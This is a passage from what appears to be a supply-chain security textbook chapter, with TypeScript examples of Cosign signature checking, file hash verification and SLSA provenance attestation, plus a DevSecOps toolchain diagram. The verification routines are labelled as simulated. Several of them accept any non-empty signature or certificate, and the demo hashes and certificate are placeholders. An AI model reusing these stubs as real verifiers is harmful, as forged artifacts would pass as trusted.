| 18 | **No CI variable exposure in logs** — mask secrets | High | All |
| 19 | **Rate limit and bill monitoring** — detect cryptomining use | Medium | All |
| 20 | **Regular rotation of CI secrets** — automate with tools | High | All |

---

## 16.6 Artifact Integrity and Signing

### 16.6.1 Sigstore / Cosign

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-1-sigstore-cosign-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-1-sigstore-cosign-handwritten.svg" alt="Handwritten: 16.6.1 Sigstore / Cosign" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-1-sigstore-cosign-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-1-sigstore-cosign-diagram.svg" alt="Diagram: 16.6.1 Sigstore / Cosign" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-1-sigstore-cosign-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-1-sigstore-cosign-sticky.svg" alt="Sticky Note: 16.6.1 Sigstore / Cosign" width="30%">
</a>


Sigstore is a set of tools for signing, verifying, and protecting software artifacts. Cosign is Sigstore's container signing tool.

#### Cosign Container Signature Verifier (TypeScript)

```typescript
/**
 * Cosign-based Container Signature Verifier
 *
 * Models the Cosign verification process including:
 * - Signature retrieval from OCI registry
 * - Public key / keyless verification
 * - Fulcio certificate validation
 * - Rekor transparency log lookup
 */

/* ─── Type Definitions ─── */

interface SignatureMetadata {
  imageRef: string;
  signatureDigest: string;
  signaturePayload: string;
  certificate?: string;
  certificateIssuer?: string;
  rekorEntry?: string;
}

interface VerificationResult {
  imageRef: string;
  verified: boolean;
  method: 'key' | 'keyless';
  signature: SignatureMetadata;
  errors: string[];
  timestamp: string;
}

interface CosignPolicy {
  allowedIdentities: Array<{
    issuer: string;
    subject: string;
  }>;
  requireRekorBundle: boolean;
  requireTimestamp: boolean;
}

type SignatureAlgorithm = 'ECDSA-P256' | 'ECDSA-P384' | 'RSA-PSS-2048' | 'RSA-PSS-4096';

/* ─── Cryptographic Helpers ─── */

class CryptoUtils {
  /**
   * Simulate ECDSA signature verification.
   * In production, this would use Node crypto or WebCrypto.
   */
  async verifySignature(
    payload: string,
    signature: string,
    publicKeyPEM: string,
    algorithm: SignatureAlgorithm
  ): Promise<boolean> {
    // In a real implementation:
    // const verify = crypto.createVerify('sha256');
    // verify.update(payload);
    // return verify.verify(publicKeyPEM, Buffer.from(signature, 'base64'));
    
    // Placeholder for demonstration
    return payload.length > 0 && signature.length > 0 && publicKeyPEM.length > 0;
  }

  /**
   * Parse and validate an x.509 certificate (simulated).
   */
  parseCertificate(certPEM: string): {
    subject: string;
    issuer: string;
    notBefore: Date;
    notAfter: Date;
    isValid: boolean;
  } {
    // In production, use crypto.X509Certificate
    const subjectMatch = certPEM.match(/Subject:\s*(.+)/);
    const issuerMatch = certPEM.match(/Issuer:\s*(.+)/);
    const notBeforeMatch = certPEM.match(/Not Before:\s*(.+)/);
    const notAfterMatch = certPEM.match(/Not After\s*:\s*(.+)/);

    return {
      subject: subjectMatch?.[1]?.trim() ?? 'unknown',
      issuer: issuerMatch?.[1]?.trim() ?? 'unknown',
      notBefore: notBeforeMatch ? new Date(notBeforeMatch[1]) : new Date(0),
      notAfter: notAfterMatch ? new Date(notAfterMatch[1]) : new Date(0),
      isValid: true,
    };
  }

  /**
   * Check certificate chain against Fulcio root CA.
   */
  verifyCertificateChain(certPEM: string, chainPEMs: string[]): boolean {
    // In production, validate the full certificate chain
    return certPEM.startsWith('-----BEGIN CERTIFICATE-----');
  }
}

/* ─── Rekor Transparency Log ─── */

class RekorClient {
  private readonly baseURL: string;

  constructor(baseURL: string = 'https://rekor.sigstore.dev') {
    this.baseURL = baseURL;
  }

  /**
   * Lookup an entry in the Rekor transparency log by artifact hash.
   */
  async lookupEntry(artifactHash: string): Promise<{
    uuid: string;
    body: string;
    integratedTime: number;
    logIndex: number;
  } | null> {
    // Simulated Rekor lookup
    if (artifactHash.length === 64) {
      return {
        uuid: 'abcdef1234567890',
        body: JSON.stringify({ spec: { signature: { content: 'simulated' } } }),
        integratedTime: Math.floor(Date.now() / 1000) - 86400,
        logIndex: 4200000,
      };
    }
    return null;
  }

  /**
   * Verify that an entry exists in the transparency log.
   */
  async verifyInclusion(uuid: string): Promise<boolean> {
    // In production, verify the Merkle inclusion proof
    return uuid.length === 16;
  }
}

/* ─── Cosign Verifier ─── */

class CosignVerifier {
  private readonly cryptoUtils: CryptoUtils;
  private readonly rekor: RekorClient;

  constructor() {
    this.cryptoUtils = new CryptoUtils();
    this.rekor = new RekorClient();
  }

  /**
   * Extract the signature from an OCI registry.
   * In production, this would pull the signature from
   * `registry/image:sha256-<digest>.sig`.
   */
  private async fetchSignature(imageRef: string): Promise<SignatureMetadata | null> {
    // Simulate fetching signature from OCI registry
    console.log(`[Cosign] Fetching signature for ${imageRef}...`);
    return {
      imageRef,
      signatureDigest: 'sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      signaturePayload: JSON.stringify({
        critical: {
          identity: { dockerReference: imageRef },
          image: { 'docker-manifest-digest': 'sha256:abc123' },
          type: 'cosign container image signature',
        },
        optional: {},
      }),
      certificate: `-----BEGIN CERTIFICATE-----
MIIDBzCCAe+gAwIBAgIQYfGxzJx8vY1R9Q6z3WzJkTANBgkqhkiG9w0BAQsFADAS
MRAwDgYDVQQKEwdBY21lIENvMB4XDTI0MDEwMTAwMDAwMFoXDTI1MDEwMTAwMDAw
MFowEjEQMA4GA1UEChMHQWNtZSBDbzCCASIwDQYJKoZIhvcNAQEBBQADggEPADCC
AQoCggEBAK0A/2h2i0m+Im1e7s9j0q8V5hf0v8JhZnDx0Bf+9cG2LIDjG/Pq
-----END CERTIFICATE-----`,
      certificateIssuer: 'https://accounts.google.com',
      rekorEntry: 'abcdef1234567890',
    };
  }

  /**
   * Perform keyless verification using Fulcio + Rekor.
   */
  async verifyKeyless(
    imageRef: string,
    expectedIdentity?: string,
    expectedIssuer?: string
  ): Promise<VerificationResult> {
    const errors: string[] = [];

    // Step 1: Fetch the signature
    const signature = await this.fetchSignature(imageRef);
    if (!signature) {
      errors.push('No signature found for image');
      return { imageRef, verified: false, method: 'keyless', signature: {} as SignatureMetadata, errors, timestamp: new Date().toISOString() };
    }

    // Step 2: Verify the certificate
    if (!signature.certificate) {
      errors.push('No certificate attached to signature');
    } else {
      const certInfo = this.cryptoUtils.parseCertificate(signature.certificate);
      if (!certInfo.isValid) {
        errors.push('Certificate is not valid');
      }
      if (certInfo.notAfter < new Date()) {
        errors.push('Certificate has expired');
      }
      if (expectedIdentity && certInfo.subject !== expectedIdentity) {
        errors.push(`Certificate subject "${certInfo.subject}" does not match expected identity "${expectedIdentity}"`);
      }
      if (expectedIssuer && certInfo.issuer !== expectedIssuer) {
        errors.push(`Certificate issuer "${certInfo.issuer}" does not match expected issuer "${expectedIssuer}"`);
      }
    }

    // Step 3: Verify Rekor transparency log inclusion
    if (signature.rekorEntry) {
      const inclusionVerified = await this.rekor.verifyInclusion(signature.rekorEntry);
      if (!inclusionVerified) {
        errors.push('Rekor inclusion verification failed');
      }
    }

    // Step 4: Verify the signature against the payload
    const sigVerified = await this.cryptoUtils.verifySignature(
      signature.signaturePayload,
      signature.signatureDigest,
      'public-key-pem',
      'ECDSA-P256'
    );

    if (!sigVerified) {
      errors.push('Signature verification failed');
    }

    return {
      imageRef,
      verified: errors.length === 0,
      method: 'keyless',
      signature,
      errors,
      timestamp: new Date().toISOString(),
    };
  }

  /**
   * Perform key-based verification using a provided public key.
   */
  async verifyWithKey(
    imageRef: string,
    publicKeyPEM: string
  ): Promise<VerificationResult> {
    const errors: string[] = [];

    const signature = await this.fetchSignature(imageRef);
    if (!signature) {
      errors.push('No signature found for image');
      return { imageRef, verified: false, method: 'key', signature: {} as SignatureMetadata, errors, timestamp: new Date().toISOString() };
    }

    const sigVerified = await this.cryptoUtils.verifySignature(
      signature.signaturePayload,
      signature.signatureDigest,
      publicKeyPEM,
      'ECDSA-P256'
    );

    if (!sigVerified) {
      errors.push('Signature does not match public key');
    }

    return {
      imageRef,
      verified: errors.length === 0,
      method: 'key',
      signature,
      errors,
      timestamp: new Date().toISOString(),
    };
  }
}

// ─── Demonstration ───

async function demonstrateCosignVerification(): Promise<void> {
  const verifier = new CosignVerifier();

  console.log('=== Cosign Keyless Verification ===');
  const result = await verifier.verifyKeyless(
    'registry.example.com/app:latest',
    'developer@example.com',
    'https://accounts.google.com'
  );

  console.log(`Image: ${result.imageRef}`);
  console.log(`Verified: ${result.verified}`);
  console.log(`Method: ${result.method}`);
  console.log(`Errors: ${result.errors.length > 0 ? result.errors.join(', ') : 'None'}`);

  if (result.verified) {
    console.log('✓ Signature is valid and trusted');
  }
}

void demonstrateCosignVerification();
```

### 16.6.2 Software Artifact Hash Verifier (TypeScript)

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-2-software-artifact-hash-verifier-typescript-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-2-software-artifact-hash-verifier-typescript-handwritten.svg" alt="Handwritten: 16.6.2 Software Artifact Hash Verifier (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-2-software-artifact-hash-verifier-typescript-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-2-software-artifact-hash-verifier-typescript-diagram.svg" alt="Diagram: 16.6.2 Software Artifact Hash Verifier (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-2-software-artifact-hash-verifier-typescript-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-6-2-software-artifact-hash-verifier-typescript-sticky.svg" alt="Sticky Note: 16.6.2 Software Artifact Hash Verifier (TypeScript)" width="30%">
</a>


```typescript
/**
 * Software Artifact Hash Verifier
 *
 * Verifies the integrity of downloaded artifacts by comparing
 * their cryptographic hashes against known-good values.
 */

import * as fs from 'fs';
import { createHash } from 'crypto';

/* ─── Type Definitions ─── */

type HashAlgorithm = 'sha256' | 'sha512' | 'sha1' | 'md5';

interface ArtifactHash {
  algorithm: HashAlgorithm;
  value: string;
}

interface ArtifactVerificationRequest {
  filePath: string;
  expectedHashes: ArtifactHash[];
  expectedSizeBytes?: number;
  artifactName?: string;
}

interface ArtifactVerificationResult {
  artifactName: string;
  filePath: string;
  verified: boolean;
  checks: Array<{
    type: 'hash' | 'size';
    algorithm?: HashAlgorithm;
    expected: string;
    actual: string;
    match: boolean;
  }>;
  errors: string[];
}

/* ─── Artifact Verifier ─── */

class ArtifactHashVerifier {
  private readonly SUPPORTED_ALGORITHMS: HashAlgorithm[] = ['sha256', 'sha512', 'sha1', 'md5'];

  /**
   * Compute the hash of a file using the specified algorithm.
   */
  private computeHash(filePath: string, algorithm: HashAlgorithm): string {
    const hash = createHash(algorithm);
    const stream = fs.createReadStream(filePath);

    return new Promise<string>((resolve, reject) => {
      stream.on('data', (chunk: Buffer) => hash.update(chunk));
      stream.on('end', () => resolve(hash.digest('hex')));
      stream.on('error', (err: Error) => reject(err));
    }) as unknown as string;
  }

  /**
   * Synchronous version for simpler usage.
   */
  private computeHashSync(filePath: string, algorithm: HashAlgorithm): string {
    const content = fs.readFileSync(filePath);
    return createHash(algorithm).update(content).digest('hex');
  }

  /**
   * Verify an artifact against expected hashes.
   */
  verify(request: ArtifactVerificationRequest): ArtifactVerificationResult {
    const errors: string[] = [];
    const checks: ArtifactVerificationResult['checks'] = [];

    const artifactName = request.artifactName ?? request.filePath.split(/[/\\]/).pop() ?? 'unknown';

    // Check file existence
    if (!fs.existsSync(request.filePath)) {
      errors.push(`File not found: ${request.filePath}`);
      return {
        artifactName,
        filePath: request.filePath,
        verified: false,
        checks,
        errors,
      };
    }

    const stats = fs.statSync(request.filePath);

    // Verify file size if specified
    if (request.expectedSizeBytes !== undefined) {
      const sizeMatch = stats.size === request.expectedSizeBytes;
      checks.push({
        type: 'size',
        expected: `${request.expectedSizeBytes} bytes`,
        actual: `${stats.size} bytes`,
        match: sizeMatch,
      });
      if (!sizeMatch) {
        errors.push(
          `Size mismatch: expected ${request.expectedSizeBytes} bytes, got ${stats.size} bytes`
        );
      }
    }

    // Verify each hash
    for (const expectedHash of request.expectedHashes) {
      if (!this.SUPPORTED_ALGORITHMS.includes(expectedHash.algorithm)) {
        errors.push(`Unsupported hash algorithm: ${expectedHash.algorithm}`);
        continue;
      }

      const computedHash = this.computeHashSync(request.filePath, expectedHash.algorithm);
      const hashMatch = computedHash === expectedHash.value.toLowerCase();

      checks.push({
        type: 'hash',
        algorithm: expectedHash.algorithm,
        expected: expectedHash.value,
        actual: computedHash,
        match: hashMatch,
      });

      if (!hashMatch) {
        errors.push(
          `${expectedHash.algorithm.toUpperCase()} hash mismatch: ` +
          `expected "${expectedHash.value}", computed "${computedHash}"`
        );
      }
    }

    return {
      artifactName,
      filePath: request.filePath,
      verified: errors.length === 0,
      checks,
      errors,
    };
  }

  /**
   * Verify an artifact by downloading expected hashes from a trusted source.
   * In production, this would fetch from a transparency log or checksum file.
   */
  async verifyFromChecksumFile(
    artifactPath: string,
    checksumPath: string,
    algorithm: HashAlgorithm = 'sha256'
  ): Promise<ArtifactVerificationResult> {
    // Parse checksum file (format: <hash>  <filename>)
    const checksumContent = fs.readFileSync(checksumPath, 'utf-8');
    const artifactName = artifactPath.split(/[/\\]/).pop() ?? '';

    const line = checksumContent
      .split('\n')
      .find((l) => l.trim().endsWith(artifactName));

    if (!line) {
      return {
        artifactName,
        filePath: artifactPath,
        verified: false,
        checks: [],
        errors: [`No checksum entry found for "${artifactName}" in "${checksumPath}"`],
      };
    }

    const parts = line.trim().split(/\s+/);
    if (parts.length < 2) {
      return {
        artifactName,
        filePath: artifactPath,
        verified: false,
        checks: [],
        errors: [`Invalid checksum format in line: "${line}"`],
      };
    }

    const expectedHash = parts[0];

    return this.verify({
      filePath: artifactPath,
      expectedHashes: [{ algorithm, value: expectedHash }],
      artifactName,
    });
  }
}

// ─── Demonstration ───

function demonstrateArtifactVerification(): void {
  const verifier = new ArtifactHashVerifier();

  // Simulate — in real usage, would be an actual file
  const testFilePath = './dist/app-bundle.js';
  
  // Create a test file for demonstration
  fs.writeFileSync(testFilePath, 'console.log("Hello, World!");');

  const result = verifier.verify({
    filePath: testFilePath,
    expectedHashes: [
      { algorithm: 'sha256', value: '6a8a560a6b8f6e7e6c8d9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0' },
      { algorithm: 'sha512', value: '0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c' },
    ],
    expectedSizeBytes: 38,
    artifactName: 'app-bundle.js',
  });

  console.log('=== Artifact Verification ===');
  console.log(`Artifact: ${result.artifactName}`);
  console.log(`Verified: ${result.verified}`);
  console.log(`Checks:`);
  for (const check of result.checks) {
    const icon = check.match ? '✓' : '✗';
    console.log(`  ${icon} ${check.type === 'hash' ? check.algorithm?.toUpperCase() : 'SIZE'}: ${check.expected}`);
    console.log(`    Expected: ${check.expected}`);
    console.log(`    Actual:   ${check.actual}`);
  }
  if (result.errors.length > 0) {
    console.log(`Errors: ${result.errors.join('; ')}`);
  }

  // Cleanup
  // fs.unlinkSync(testFilePath);
}

demonstrateArtifactVerification();
```

---

## 16.7 SLSA — Supply Chain Levels for Software Artifacts

SLSA (pronounced "salsa") is a security framework from Google that specifies a graduated set of security levels for software supply chain integrity.

### 16.7.1 SLSA Levels

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-1-slsa-levels-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-1-slsa-levels-handwritten.svg" alt="Handwritten: 16.7.1 SLSA Levels" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-1-slsa-levels-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-1-slsa-levels-diagram.svg" alt="Diagram: 16.7.1 SLSA Levels" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-1-slsa-levels-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-1-slsa-levels-sticky.svg" alt="Sticky Note: 16.7.1 SLSA Levels" width="30%">
</a>


```mermaid
flowchart TB
    subgraph SLSA_L0["SLSA L0 — No guarantees"]
        A0[Any build process]
        A0 -->|No provenance| A0e[No security guarantees]
    end

    subgraph SLSA_L1["SLSA L1 — Basic provenance"]
        B1[Build process]
        B1 -->|Provenance generated| P1[Provenance: who, what, when]
        P1 -->|Not verified| B1e[Minimal protection]
    end

    subgraph SLSA_L2["SLSA L2 — Tamper resistance"]
        C2[Hosted build platform]
        C2 -->|Signed provenance| P2[Provenance: signed by platform]
        P2 -->|Isolated builds| C2e[Resistant to tampering]
    end

    subgraph SLSA_L3["SLSA L3 — Hardened builds"]
        D3[Hardened build platform]
        D3 -->|No user-defined steps| P3[Provenance: full dependency tree]
        P3 -->|Hermetic + Reproducible| D3e[Maximum integrity]
    end

    subgraph SLSA_L4["SLSA L4 — Maximum security"]
        E4[Two-person review]
        E4 -->|All of L3 + audits| P4[Provenance: peer-reviewed]
        P4 -->|Security audit + FIPS| E4e[Highest assurance]
    end

    SLSA_L0 --> SLSA_L1
    SLSA_L1 --> SLSA_L2
    SLSA_L2 --> SLSA_L3
    SLSA_L3 --> SLSA_L4
```

**Figure 16.3**: SLSA maturity model showing progressive security guarantees from L0 to L4.

### 16.7.2 SLSA Requirements Summary

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-2-slsa-requirements-summary-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-2-slsa-requirements-summary-handwritten.svg" alt="Handwritten: 16.7.2 SLSA Requirements Summary" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-2-slsa-requirements-summary-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-2-slsa-requirements-summary-diagram.svg" alt="Diagram: 16.7.2 SLSA Requirements Summary" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-2-slsa-requirements-summary-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-2-slsa-requirements-summary-sticky.svg" alt="Sticky Note: 16.7.2 SLSA Requirements Summary" width="30%">
</a>


| Requirement | L1 | L2 | L3 | L4 |
|---|---|---|---|---|
| Provenance exists | ✓ | ✓ | ✓ | ✓ |
| Provenance is authenticated | | ✓ | ✓ | ✓ |
| Provenance is non-forgeable | | | ✓ | ✓ |
| Build service is hosted | | ✓ | ✓ | ✓ |
| Build is isolated | | | ✓ | ✓ |
| Build is hermetic | | | ✓ | ✓ |
| Build is reproducible | | | | ✓ |
| Dependencies are enumerated | | | ✓ | ✓ |
| Two-person review | | | | ✓ |
| Security audit | | | | ✓ |

### 16.7.3 SLSA Provenance Attestation Builder (TypeScript)

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-3-slsa-provenance-attestation-builder-typescript-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-3-slsa-provenance-attestation-builder-typescript-handwritten.svg" alt="Handwritten: 16.7.3 SLSA Provenance Attestation Builder (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-3-slsa-provenance-attestation-builder-typescript-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-3-slsa-provenance-attestation-builder-typescript-diagram.svg" alt="Diagram: 16.7.3 SLSA Provenance Attestation Builder (TypeScript)" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-3-slsa-provenance-attestation-builder-typescript-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-7-3-slsa-provenance-attestation-builder-typescript-sticky.svg" alt="Sticky Note: 16.7.3 SLSA Provenance Attestation Builder (TypeScript)" width="30%">
</a>


```typescript
/**
 * SLSA Provenance Attestation Builder
 *
 * Generates in-toto attestations that conform to the SLSA
 * provenance predicate format (v1).
 *
 * Reference: https://slsa.dev/provenance/v1
 */

/* ─── Type Definitions ─── */

interface SLSAProvenanceV1 {
  type: 'https://slsa.dev/provenance/v1';
  predicateType: 'https://slsa.dev/provenance/v1';
  subject: Array<{
    name: string;
    digest: Record<string, string>;
  }>;
  predicate: {
    buildDefinition: {
      buildType: string;
      externalParameters: Record<string, unknown>;
      internalParameters: Record<string, unknown>;
      resolvedDependencies: Array<{
        uri: string;
        digest: Record<string, string>;
      }>;
    };
    runDetails: {
      builder: {
        id: string;
      };
      metadata: {
        invocationId?: string;
        startedOn: string;
        finishedOn: string;
      };
      byproducts?: Array<{
        name: string;
        digest?: Record<string, string>;
      }>;
    };
  };
}

interface SLSAConfig {
  level: 0 | 1 | 2 | 3 | 4;
  builderID: string;
  buildType: string;
  repositoryURI: string;
  commitSHA: string;
  buildCommand: string;
  artifacts: Array<{
    name: string;
    sha256: string;
  }>;
  dependencies: Array<{
    uri: string;
    sha256?: string;
  }>;
}

/* ─── Provenance Builder ─── */

class SLSAProvenanceBuilder {
  /**
   * Generate an in-toto statement with SLSA provenance predicate.
   */
  build(config: SLSAConfig): SLSAProvenanceV1 {
    const startedOn = new Date(Date.now() - 120000); // 2 minutes ago
    const finishedOn = new Date();

    const subjects = config.artifacts.map((artifact) => ({
      name: artifact.name,
      digest: { sha256: artifact.sha256 },
    }));

    const resolvedDependencies = config.dependencies.map((dep) => ({
      uri: dep.uri,
      ...(dep.sha256 ? { digest: { sha256: dep.sha256 } } : {}),
    }));

    // Add the source repository as a dependency
    resolvedDependencies.push({
      uri: config.repositoryURI,
      digest: { sha1: config.commitSHA },
    });

    const attestation: SLSAProvenanceV1 = {
      type: 'https://slsa.dev/provenance/v1',
      predicateType: 'https://slsa.dev/provenance/v1',
      subject: subjects,
      predicate: {
        buildDefinition: {
          buildType: config.buildType,
          externalParameters: {
            repository: config.repositoryURI,
            commit: config.commitSHA,
            command: config.buildCommand,
          },
          internalParameters: {},
          resolvedDependencies,
        },
        runDetails: {
          builder: {
            id: config.builderID,
          },
          metadata: {
            invocationId: `build-${Date.now()}`,
            startedOn: startedOn.toISOString(),
            finishedOn: finishedOn.toISOString(),
          },
        },
      },
    };

    // Add level-appropriate extensions
    if (config.level >= 2) {
      // L2+: Builder identity is authenticated (e.g., OIDC)
      attestation.predicate.runDetails.builder.id = 
        `${config.builderID}@${finishedOn.toISOString()}`;
    }

    if (config.level >= 3) {
      // L3+: Hermetic build — enumerate all dependencies
      attestation.predicate.buildDefinition.internalParameters = {
        hermetic: true,
        isolated: true,
      };
    }

    if (config.level >= 4) {
      // L4+: Two-person review — include review metadata
      attestation.predicate.buildDefinition.internalParameters = {
        ...attestation.predicate.buildDefinition.internalParameters,
        twoPersonReview: true,
        reproducible: true,
      };
      attestation.predicate.runDetails.byproducts = [
        {
          name: 'build-log',
          digest: { sha256: '0000000000000000000000000000000000000000000000000000000000000000' },
        },
      ];
    }

    return attestation;
  }

  /**
   * Sign the attestation (simulated DSSE signature envelope).
   * In production, use `dsse` library or Sigstore client.
   */
  sign(
    attestation: SLSAProvenanceV1,
    signerPrivateKeyPEM: string,
    keyID: string
  ): {
    payload: string;
    payloadType: string;
    signatures: Array<{
      sig: string;
      keyid: string;
    }>;
  } {
    const payload = JSON.stringify(attestation);
    const payloadBase64 = Buffer.from(payload).toString('base64');

    return {
      payload: payloadBase64,
      payloadType: 'application/vnd.in-toto+json',
      signatures: [
        {
          sig: 'simulated-signature-hex-value', // Real: crypto.sign('sha256', Buffer.from(payload), signerPrivateKeyPEM)
          keyid: keyID,
        },
      ],
    };
  }

  /**
   * Verify the SLSA level requirements.
   */
  verifyLevelRequirements(config: SLSAConfig): string[] {
    const violations: string[] = [];

    if (config.level >= 1) {
      if (config.artifacts.length === 0) {
        violations.push('L1: At least one artifact must be specified');
      }
      if (!config.commitSHA) {
        violations.push('L1: Source commit SHA is required for provenance');
      }
    }

    if (config.level >= 2) {
      if (!config.builderID) {
        violations.push('L2: Builder ID must be authenticated');
      }
      if (!config.buildType) {
        violations.push('L2: Build type must be specified');
      }
    }

    if (config.level >= 3) {
      if (config.dependencies.length === 0) {
        violations.push('L3: All dependencies must be enumerated');
      }
      const missingHashes = config.dependencies.filter((d) => !d.sha256);
      if (missingHashes.length > 0) {
        violations.push(
          `L3: Dependencies must include hashes: ${missingHashes.map((d) => d.uri).join(', ')}`
        );
      }
    }

    if (config.level >= 4) {
      violations.push('L4: Requires two-person review (verify via external audit trail)');
      violations.push('L4: Requires security audit documentation');
    }

    return violations;
  }
}

// ─── Demonstration ───

function demonstrateSLSABuilder(): void {
  const builder = new SLSAProvenanceBuilder();

  const config: SLSAConfig = {
    level: 3,
    builderID: 'https://github.com/actions/github-actions',
    buildType: 'https://github.com/actions/build/v1',
    repositoryURI: 'git+https://github.com/org/app.git',
    commitSHA: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0',
    buildCommand: 'npm ci && npm run build && docker build -t app .',
    artifacts: [
      {
        name: 'app:latest',
        sha256: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
      },
      {
        name: 'app-bundle.js',
        sha256: '6a8a560a6b8f6e7e6c8d9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0',
      },
    ],
    dependencies: [
      {
        uri: 'npm://lodash@4.17.21',
        sha256: 'c3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3',
      },
      {
        uri: 'npm://express@4.18.2',
        sha256: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e',
      },
    ],
  };

  console.log('=== SLSA Provenance Attestation ===');
  console.log(`Target Level: SLSA L${config.level}`);

  // Check requirements
  const violations = builder.verifyLevelRequirements(config);
  if (violations.length > 0) {
    console.log('\nRequirement Violations:');
    violations.forEach((v) => console.log(`  ✗ ${v}`));
  } else {
    console.log('✓ All requirements met');
  }

  // Generate attestation
  const attestation = builder.build(config);
  console.log('\nAttestation (SLSA L3):');
  console.log(JSON.stringify(attestation, null, 2));
  
  // Sign it
  const signedEnvelope = builder.sign(attestation, 'private-key-pem', 'key-001');
  console.log('\nSigned DSSE Envelope:');
  console.log(JSON.stringify(signedEnvelope, null, 2));
}

demonstrateSLSABuilder();
```

---

## 16.8 DevSecOps Integration

DevSecOps integrates security practices into DevOps pipelines, making security a shared responsibility throughout the software development lifecycle.

### 16.8.1 Security Tools Integration

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-1-security-tools-integration-handwritten.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-1-security-tools-integration-handwritten.svg" alt="Handwritten: 16.8.1 Security Tools Integration" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-1-security-tools-integration-diagram.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-1-security-tools-integration-diagram.svg" alt="Diagram: 16.8.1 Security Tools Integration" width="30%">
</a>
<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-1-security-tools-integration-sticky.svg" target="_blank" rel="noopener">
  <img src="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-1-security-tools-integration-sticky.svg" alt="Sticky Note: 16.8.1 Security Tools Integration" width="30%">
</a>


```mermaid
flowchart LR
    subgraph DevSecOps["DevSecOps Toolchain"]
        direction TB
        SAST[SAST: CodeQL, Semgrep, SonarQube]
        SCA[SCA: Snyk, OWASP DC, Trivy]
        Secrets[Secrets: TruffleHog, Gitleaks]
        Container[Container: Trivy, Grype, Clair]
        DAST[DAST: ZAP, Burp Suite]
        Fuzzing[Fuzzing: OSS-Fuzz, LibFuzzer]
    end

    subgraph Stages["Pipeline Stages"]
        Commit[Commit]
        Build[Build]
        Test[Test]
        Staging[Staging]
        Production[Production]
    end

    Commit --> SAST
    Commit --> Secrets
    Build --> SCA
    Build --> Container
    Test --> DAST
    Test --> Fuzzing
    Staging --> DAST
    Production --> Monitoring[Runtime Monitoring]

    SAST -->|Fail build| Build
    Secrets -->|Fail commit| Commit
    SCA -->|Fail build| Build
    Container -->|Fail deploy| Staging
    DAST -->|Fail promotion| Production
```

### 16.8.2 DevSecOps Integration Checklist

<a href="../../assets/images/diagrams/cyber-security/16-supply-chain-cicd/16-8-2-devsecops-integration-checklist-handwritten.svg" target="_blank" rel="noopener">
